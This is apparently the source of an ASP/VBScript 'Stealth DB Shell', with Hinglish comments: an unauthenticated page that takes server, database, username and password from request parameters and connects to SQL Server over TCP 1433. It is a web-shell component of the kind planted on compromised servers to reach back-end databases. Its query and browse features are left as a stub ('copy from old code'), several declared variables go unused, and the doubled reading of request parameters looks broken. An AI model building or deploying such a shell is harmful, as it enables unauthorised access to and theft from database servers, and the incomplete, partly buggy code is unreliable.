<%@ Language=VBScript %>
<%
Dim Conn, RS, ConnStr, ErrMsg
Dim srv, dbn, usr, pwd, act, qry, tbl

srv = Trim(Request("server") & Request.Form("server"))
dbn = Trim(Request("dbname") & Request.Form("dbname"))
usr = Trim(Request("user") & Request.Form("user"))
pwd = Trim(Request("pass") & Request.Form("pass"))
act = Request("act")
qry = Request("query")
tbl = Request("tbl")

ErrMsg = ""

If srv <> "" Then
    ' TCP/IP force kar rahe hain + modern provider
    ConnStr = "Provider=SQLNCLI11;Server=tcp:" & srv & ",1433;"
    If dbn <> "" Then ConnStr = ConnStr & "Database=" & dbn & ";"
    ConnStr = ConnStr & "Uid=" & usr & ";Pwd=" & pwd & ";"

    ' Agar Native Client nahi hai to ODBC fallback try kar
    ' ConnStr = "Driver={SQL Server};Server=tcp:" & srv & ",1433;Database=" & dbn & ";Uid=" & usr & ";Pwd=" & pwd & ";"

    Set Conn = Server.CreateObject("ADODB.Connection")
    On Error Resume Next
    Conn.Open ConnStr
    If Err.Number <> 0 Then
        ErrMsg = "Connection Failed: " & Err.Description & " (Code: " & Err.Number & ")<br><br>" & _
                 "Abhi bhi fail ho raha to:<br>" & _
                 "1. SQL Config Manager mein TCP/IP enable + port 1433 set kar<br>" & _
                 "2. SQL Server Browser service start kar<br>" & _
                 "3. Server field mein sahi instance daal (localhost\SQLEXPRESS ya IP\SQLEXPRESS)<br>" & _
                 "4. Firewall port 1433 allow kar"
        Set Conn = Nothing
    End If
    On Error Goto 0
End If
%>

<html>
<head><title>Stealth DB Shell - TCP Fix</title></head>
<body style="font-family:consolas; background:#000; color:#0f0; padding:20px;">

<h2>DB Shell (Connection Form)</h2>

<form method="post">
    Server: <input name="server" value="<%=Server.HTMLEncode(srv)%>" size="40" placeholder="localhost ya 127.0.0.1 ya IP\SQLEXPRESS"><br><br>
    DB: <input name="dbname" value="<%=Server.HTMLEncode(dbn)%>" size="40" placeholder="master"><br><br>
    User: <input name="user" value="<%=Server.HTMLEncode(usr)%>" size="40"><br><br>
    Pass: <input type="password" name="pass" value="<%=Server.HTMLEncode(pwd)%>" size="40"><br><br>
    <input type="submit" value="Connect">
</form>

<% If ErrMsg <> "" Then %>
    <div style="color:red; background:#300; padding:15px; margin:15px 0; border:2px solid red; font-weight:bold;">
        <%=ErrMsg%>
    </div>
<% ElseIf Conn Is Nothing Then %>
    <p style="color:yellow;">Connect first. Server mein instance name zaroor daal agar SQLEXPRESS hai.</p>
<% Else %>
    <div style="color:lime; background:#030; padding:15px; border:2px solid lime;">
        Connected! Server: <%=srv%> | Current DB: <%=dbn%>
    </div>

    <!-- Baaki code same rakh sakta hai (databases list, tables, browse, custom query) -->
    <!-- Yeh part copy kar lena purane code se agar chahiye -->

<% End If %>

</body>
</html>

<%
If IsObject(RS) Then RS.Close
If IsObject(Conn) Then Conn.Close
%>
